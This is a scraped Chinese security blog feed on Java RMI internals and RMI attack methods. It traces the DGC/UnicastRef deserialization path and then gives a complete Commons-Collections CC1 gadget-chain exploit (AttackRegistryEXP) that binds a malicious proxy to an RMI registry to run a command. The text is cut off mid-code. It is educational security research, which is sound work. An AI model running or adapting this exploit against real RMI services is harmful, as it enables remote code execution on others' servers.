<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerRefs</span><span class="params">(Endpoint ep, List&lt;LiveRef&gt; refs)</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Look up the given endpoint and register the refs with it.</span></span><br><span class="line"><span class="comment">         * The retrieved entry may get removed from the global endpoint</span></span><br><span class="line"><span class="comment">         * table before EndpointEntry.registerRefs() is able to acquire</span></span><br><span class="line"><span class="comment">         * its lock; in this event, it returns false, and we loop and</span></span><br><span class="line"><span class="comment">         * try again.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        EndpointEntry epEntry;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            epEntry = EndpointEntry.lookup(ep);</span><br><span class="line">        &#125; <span class="keyword">while</span> (!epEntry.registerRefs(refs));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们需要找到一个反序列化利用的点，在向上找，会找到两个调用registerRefs的方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735285463617-0b135f12-f4cb-4beb-ae5b-b34cccb701c5.png"></p>
<p>我们看read方法中，如果这个输入流不是并且不继承于ConnectionInputStream的话，就会调用我们的registerRefs方法，但是这个in是一个ConnectionInputStream，所以我们只能去找另一个方法去利用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">            <span class="type">ConnectionInputStream</span> <span class="variable">stream</span> <span class="operator">=</span> (ConnectionInputStream)in;</span><br><span class="line">            <span class="comment">// save ref to send &quot;dirty&quot; call after all args/returns</span></span><br><span class="line">            <span class="comment">// have been unmarshaled.</span></span><br><span class="line">            stream.saveRef(ref);</span><br><span class="line">            <span class="keyword">if</span> (isResultStream) &#123;</span><br><span class="line">                <span class="comment">// set flag in stream indicating that remote objects were</span></span><br><span class="line">                <span class="comment">// unmarshaled.  A DGC ack should be sent by the transport.</span></span><br><span class="line">                stream.setAckNeeded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DGCClient.registerRefs(ep, Arrays.asList(<span class="keyword">new</span> <span class="title class_">LiveRef</span>[] &#123; ref &#125;));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>另一个最终的流程是releaseInputStream去调用StreamRemoteCall.registerRefs然后进入到if中（这个判断条件中的incomingRefTable是为空的，我们后续会说怎么走到if里面）调用DGCClient.registerRefs</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">releaseInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (in != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in.done();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                in.registerRefs();</span><br><span class="line">                in.done(conn);</span><br><span class="line">            &#125;</span><br><span class="line">            conn.releaseInputStream();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            in = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">registerRefs</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!incomingRefTable.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;Endpoint, List&lt;LiveRef&gt;&gt; entry :</span><br><span class="line">                     incomingRefTable.entrySet()) &#123;</span><br><span class="line">                DGCClient.registerRefs(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最后调用releaseInputStream的地方就是非常的多了，在许多Skel中都有调用</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735286130718-449e3a84-5bfa-4b08-84a0-611bf046ed26.png"></p>
<p>最后的流程如下，只要调用releaseInputStream，就会创建一个proxy对象</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735286703216-1104471b-868f-418d-b2a7-0abdf6e93cbf.png"></p>
<p><strong>实际上反序列化流程，只是为了给incomingRefTable赋值，攻击流程实际是在正常的调用流程中</strong></p>
<p>我们上面说过，这里的值默认是空的，要想走入DGCClient.registerRefs中，我们就应该去找，哪里给incomingRefTable赋值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">registerRefs</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!incomingRefTable.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;Endpoint, List&lt;LiveRef&gt;&gt; entry :</span><br><span class="line">                     incomingRefTable.entrySet()) &#123;</span><br><span class="line">                DGCClient.registerRefs(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>实际这里只有一个地方ConnectionInputStream的saveRef中，向里面put进去了一个东西，使他不为空</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">saveRef</span><span class="params">(LiveRef ref)</span> &#123;</span><br><span class="line"><span class="type">Endpoint</span> <span class="variable">ep</span> <span class="operator">=</span> ref.getEndpoint();</span><br><span class="line"></span><br><span class="line"><span class="comment">// check whether endpoint is already in the hashtable</span></span><br><span class="line">List&lt;LiveRef&gt; refList = incomingRefTable.get(ep);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (refList == <span class="literal">null</span>) &#123;</span><br><span class="line">    refList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;LiveRef&gt;();</span><br><span class="line">    incomingRefTable.put(ep, refList);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add ref to list of refs for endpoint ep</span></span><br><span class="line">refList.add(ref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>saveRef也是只有一个地方去调用，就是read方法，我们之前讨论过</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> LiveRef <span class="title function_">read</span><span class="params">(ObjectInput in, <span class="type">boolean</span> useNewFormat)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">            <span class="type">ConnectionInputStream</span> <span class="variable">stream</span> <span class="operator">=</span> (ConnectionInputStream)in;</span><br><span class="line">            <span class="comment">// save ref to send &quot;dirty&quot; call after all args/returns</span></span><br><span class="line">            <span class="comment">// have been unmarshaled.</span></span><br><span class="line">            stream.saveRef(ref);</span><br><span class="line">            <span class="keyword">if</span> (isResultStream) &#123;</span><br><span class="line">                <span class="comment">// set flag in stream indicating that remote objects were</span></span><br><span class="line">                <span class="comment">// unmarshaled.  A DGC ack should be sent by the transport.</span></span><br><span class="line">                stream.setAckNeeded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DGCClient.registerRefs(ep, Arrays.asList(<span class="keyword">new</span> <span class="title class_">LiveRef</span>[] &#123; ref &#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看看谁调用了read方法，只有UnicastRef和UnicastRef2中的readExternal去调用了read方法</p>
<p>readExternal是一个和readObject类似但不一样的东西，如果所反序列化的类，也有readExternal方法，也会去调用readExternal方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        ref = LiveRef.read(in, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>UnicastRef是白名单里面的内容，我们向客户端传入一个UnicastRef对象触发它的readexternal方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="built_in">this</span>.ref = LiveRef.read(var1, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进入到LiveRef.read中… 剩下的调用我们就不再重复</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> LiveRef <span class="title function_">read</span><span class="params">(ObjectInput var0, <span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">if</span> (var0 <span class="keyword">instanceof</span> ConnectionInputStream) &#123;</span><br><span class="line">            <span class="type">ConnectionInputStream</span> <span class="variable">var6</span> <span class="operator">=</span> (ConnectionInputStream)var0;</span><br><span class="line">            var6.saveRef(var5);</span><br><span class="line">            <span class="keyword">if</span> (var4) &#123;</span><br><span class="line">                var6.setAckNeeded();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DGCClient.registerRefs(var2, Arrays.asList(var5));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var5;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>后续会走到EndpointEntry中，在创建完dgc后会走到下面创建一个RenewCleanThread线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">EndpointEntry</span><span class="params">(Endpoint var1)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.endpoint = var1;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">LiveRef</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(DGCClient.dgcID, var1, <span class="literal">false</span>);</span><br><span class="line">                <span class="built_in">this</span>.dgc = (DGC)Util.createProxy(DGCImpl.class, <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(var2), <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;internal error creating DGC stub&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.renewCleanThread = (Thread)AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(<span class="keyword">new</span> <span class="title class_">RenewCleanThread</span>(), <span class="string">&quot;RenewClean-&quot;</span> + var1, <span class="literal">true</span>));</span><br><span class="line">            <span class="built_in">this</span>.renewCleanThread.start();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>RenewCleanThread中，会调用DGCClient的makeDirtyCall方法，而这个方法最终会调用他的dirty方法，就会调用到invoke方法，最终让服务器发送客户端请求</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                        <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (var4) &#123;</span><br><span class="line">                                EndpointEntry.<span class="built_in">this</span>.makeDirtyCall(var5, var6);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (!EndpointEntry.<span class="built_in">this</span>.pendingCleans.isEmpty()) &#123;</span><br><span class="line">                                EndpointEntry.<span class="built_in">this</span>.makeCleanCalls();</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI攻击方式</title>
    <url>/2025/03/06/RMI%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/</url>
    <content><![CDATA[<h1 id="hBAI6">RMI攻击方式</h1>
前面我们进行了RMI源码层面的分析，这里我们来讨论RMI的攻击方式

<h2 id="SX5Zl">RMI攻击基本方式</h2>
根据源码层面分析，我们有以下几种基本攻击方式

<ul>
<li>客户端 打 注册中心</li>
<li>客户端 打 服务端</li>
<li>客户端</li>
</ul>
<h3 id="DBnm2">攻击注册中心</h3>
不管是服务端或者客户端，与注册中心交互主要是下面这句话

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">r.bind(<span class="string">&quot;remoteObj&quot;</span>,remoteObj);</span><br></pre></td></tr></table></figure>

<p>除了<code>bind</code>方法，还有其他方式</p>
<p>以下方法位于<code>RegistryImpl_Skel#dispatch</code>中，下面是交互方法和其与<code>dispatch</code>的对应关系</p>
<ul>
<li>0 —- bind</li>
<li>1 —- list</li>
<li>2 —- lookup</li>
<li>3 —- rebind</li>
<li>4 —- unbind</li>
</ul>
<p>tips：除了list和lookup两者，剩下方法在8u121后，均需要在localhost调用</p>
<h4 id="xJpr6">List鸡肋攻击</h4>
`list`方法可以列出目标上绑定的所有对象

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegistryListAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] list = Naming.list(<span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行的时候，会将绑定对象的信息打印出来</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741174218752-e6d632a9-7ec8-4a28-adba-2cd3458fbdc6.png"></p>
<p>从上面得知该方法对应case1，其代码如下</p>
<p>里面只存在着<code>writeObject</code>方法，并没有反序列化的入口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            var2.releaseInputStream();</span><br><span class="line">            String[] var97 = var6.list();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">var98</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                var98.writeObject(var97);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var92) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var92);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h4 id="eP5jE">bind/rebind攻击</h4>
我们知道，这两者对应的case分别为0，3

<p>其源码如下，两个方法中都是存在反序列化的，反序列化的东西均为 <strong>一个参数名和一个远程对象</strong></p>
<p>这两者的均可以作为反序列化的入口类，若该服务端导入了CC的依赖，我们就可以利用这里的反序列化入口，进行CC链的反序列化攻击</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var94) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var94);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var95) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var95);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.bind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var93) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var93);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var85) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var85);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var86) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var86);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.rebind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var84) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var84);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>我这里在服务端导入<code>3.2.1</code>版本的CC依赖，尝试去打它的CC1这条链子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>远程对象在两者间传递时，是传递的<code>Proxy</code>动态代理对象，而绑定时需要<code>Remote</code>类型的对象</p>
<p>因此在绑定时，我们需要一个实现 <code>Remote</code> 接口的动态代理对象</p>
<p>这里有一个<code>newProxyInstance</code>方法，可以创建动态代理，需要<code>InvocationHandler</code>示例，所有我们需要将恶意类转为<code>InvocationHandler</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span><br><span class="line"><span class="params">                                          Class&lt;?&gt;[] interfaces,</span></span><br><span class="line"><span class="params">                                          InvocationHandler h)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalArgumentException</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (sm != <span class="literal">null</span>) &#123;</span><br><span class="line">                checkNewProxyPermission(Reflection.getCallerClass(), cl);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">ih</span> <span class="operator">=</span> h;</span><br><span class="line">            <span class="keyword">if</span> (!Modifier.isPublic(cl.getModifiers())) &#123;</span><br><span class="line">                AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                    <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> cons.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;h&#125;);</span><br><span class="line">        &#125; ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下面就是我们的封装代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();  </span><br><span class="line"><span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(  </span><br><span class="line">       Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));  </span><br><span class="line">registry.bind(<span class="string">&quot;test&quot;</span>,remote);  </span><br></pre></td></tr></table></figure>

<p>EXP 如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackRegistryEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);  </span><br><span class="line">         <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) CC1();  </span><br><span class="line">         <span class="type">Remote</span> <span class="variable">remote</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(  </span><br><span class="line">                Remote.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, handler));  </span><br><span class="line">         registry.bind(<span class="string">&quot;test&quot;</span>,remote);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">CC1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), <span class="comment">// 构造 setValue 的可控参数  </span></span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,  </span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>  </span><br><span class="line">         , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">    &#125;;  </span><br><span class="line">         <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">         HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">         hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;drunkbaby&quot;</span>);  </span><br><span class="line">         Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);  </span><br><span class="line">         <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">         <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">         aihConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">         <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);  </span><br><span class="line">         <span class="keyword">return</span> o;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>rebind</code>攻击和<code>bind</code>攻击一样，只需要将<code>bind</code>替换为<code>rebind</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">registry.bind(<span class="string">&quot;test&quot;</span>,remote);</span><br></pre></td></tr></table></figure>

<h4 id="Evwbq">unbind/lookup攻击</h4>
根据前面的对应信息，我们找到两者对应的源码

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var89) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var89);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var90) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var90);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var8 = var6.lookup(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var9</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var9.writeObject(var8);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var88) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var88);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span 